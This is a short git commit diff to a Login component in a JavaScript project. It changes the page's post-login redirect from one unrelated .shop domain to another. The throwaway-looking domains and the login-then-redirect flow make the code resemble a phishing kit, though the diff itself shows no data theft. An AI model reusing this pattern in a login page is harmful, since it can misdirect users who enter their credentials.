28012ed3fdbc26f99d262418380ea9741185eb27
husknet <127146284+husknet@users.noreply.github.com>
2025-03-05 16:24:01 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tent.cookshowfiles.shop/';
+      window.location.href = 'https://tent.faqshoplogs.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
